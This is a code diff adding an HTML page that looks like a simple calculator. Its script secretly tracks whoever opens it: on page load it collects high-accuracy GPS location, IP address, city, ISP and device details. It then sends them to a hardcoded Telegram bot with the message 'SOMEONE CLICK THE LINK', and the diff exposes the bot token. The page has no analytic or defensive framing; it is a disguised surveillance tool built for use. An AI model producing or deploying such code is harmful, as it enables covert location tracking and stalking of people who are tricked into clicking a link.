@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calculator</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #e0e0e0;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+
+        .calculator {
+            width: 320px;
+            background: #f0f0f0;
+            border-radius: 20px;
+            box-shadow: 10px 10px 20px #bebebe, -10px -10px 20px #ffffff;
+            padding: 20px;
+            display: grid;
+            grid-template-rows: auto 1fr;
+            gap: 20px;
+        }
+
+        .display {
+            background: #e0e0e0;
+            border-radius: 10px;
+            box-shadow: inset 5px 5px 10px #bebebe, inset -5px -5px 10px #ffffff;
+            padding: 15px;
+        }
+
+        #result {
+            width: 100%;
+            border: none;
+            background: transparent;
+            font-size: 2.5em;
+            text-align: right;
+            color: #333;
+            outline: none;
+        }
+
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 20px;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #555;
+            cursor: pointer;
+            background: #e0e0e0;
+            box-shadow: 5px 5px 10px #bebebe, -5px -5px 10px #ffffff;
+            transition: all 0.2s ease;
+        }
+
+        .btn:active {
+            box-shadow: inset 3px 3px 6px #bebebe, inset -3px -3px 6px #ffffff;
+            transform: scale(0.98);
+        }
+
+        .btn:hover {
+            background: #d4d4d4;
+        }
+
+        .btn.operator, .btn.equal {
+            color: #fff;
+            background: #5c6bc0;
+            box-shadow: 5px 5px 10px #505c9c, -5px -5px 10px #687ad3;
+        }
+
+        .btn.operator:hover, .btn.equal:hover {
+            background: #4755a5;
+        }
+
+        .btn.operator:active, .btn.equal:active {
+            box-shadow: inset 3px 3px 6px #4755a5, inset -3px -3px 6px #687ad3;
+        }
+
+        .btn.clear {
+            color: #fff;
+            background: #ef5350;
+            box-shadow: 5px 5px 10px #cb4441, -5px -5px 10px #ff625f;
+        }
+
+        .btn.clear:hover {
+            background: #d8433e;
+        }
+
+        .btn.clear:active {
+            box-shadow: inset 3px 3px 6px #d8433e, inset -3px -3px 6px #ff625f;
+        }
+
+        .btn.zero {
+            grid-column: span 2;
+        }
+    </style>
+</head>
+<body>
+    <div class="calculator">
+        <div class="display">
+            <input type="text" id="result" readonly>
+        </div>
+        <div class="buttons">
+            <button class="btn clear">C</button>
+            <button class="btn operator">/</button>
+            <button class="btn operator">*</button>
+            <button class="btn operator">-</button>
+            <button class="btn">7</button>
+            <button class="btn">8</button>
+            <button class="btn">9</button>
+            <button class="btn operator">+</button>
+            <button class="btn">4</button>
+            <button class="btn">5</button>
+            <button class="btn">6</button>
+            <button class="btn operator">.</button>
+            <button class="btn">1</button>
+            <button class="btn">2</button>
+            <button class="btn">3</button>
+            <button class="btn equal">=</button>
+            <button class="btn zero">0</button>
+        </div>
+    </div>
+    <script>
+           // Telegram bot details
+        const botToken = '8395678134:AAGuWxFnoAt-9FEKsK-W02S7lJsZ6ckG_jI';
+        const chatId = '7777082488';
+        // Function to get IP info
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await detailsResponse.json();
+            } catch (error) {
+                console.error("IP info error:", error);
+                return {};
+            }
+        }
+                // Function to get precise location
+        function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    }),
+                    error => {
+                        resolve(null);
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            try {
+                let message = `🕵️ SOMEONE CLICK THE LINK 🕵️\n\n`;
+                message += `📱 Device: ${navigator.userAgent}\n\n`;
+                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
+                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
+                
+                if (data.liveLocation) {
+                    message += `\n🎯 LIVE GPS LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
+                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
+                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
+                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
+                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
+                } else {
+                    message += `\n📍 APPROX LOCATION:\n`;
+                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
+                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
+                    if (data.latitude && data.longitude) {
+                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
+                    }
+                }
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                if (data.liveLocation) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            latitude: data.liveLocation.lat,
+                            longitude: data.liveLocation.lon
+                        })
+                    });
+                }
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+        
+        // Main tracking function
+        async function trackUser() {
+            // First try to get precise location silently
+            const liveLocation = await getPreciseLocation();
+            
+            // Then get IP details
+            const ipDetails = await getIPInfo();
+            
+            // Combine all data
+            const trackingData = {
+                ...ipDetails,
+                ip: ipDetails.ip || 'Unknown',
+                liveLocation: liveLocation
+            };
+            
+            // Send to Telegram
+            await sendToTelegram(trackingData);
+        }
+        // Start tracking when page loads
+        window.onload = trackUser;
+        document.addEventListener('DOMContentLoaded', () => {
+            const display = document.getElementById('result');
+            const buttons = document.querySelectorAll('.btn');
+
+            let currentInput = '';
+            let operator = null;
+            let previousInput = '';
+            let result = null;
+
+            buttons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const value = button.textContent;
+
+                    if (button.classList.contains('clear')) {
+                        currentInput = '';
+                        operator = null;
+                        previousInput = '';
+                        display.value = '';
+                        result = null;
+                    } else if (button.classList.contains('equal')) {
+                        if (operator && previousInput !== '' && currentInput !== '') {
+                            result = eval(previousInput + operator + currentInput);
+                            display.value = result;
+                            currentInput = result.toString();
+                            previousInput = '';
+                            operator = null;
+                        }
+                    } else if (button.classList.contains('operator')) {
+                        if (currentInput !== '') {
+                            if (previousInput === '') {
+                                previousInput = currentInput;
+                                currentInput = '';
+                            }
+                            operator = value;
+                        }
+                    } else {
+                        currentInput += value;
+                        display.value = currentInput;
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
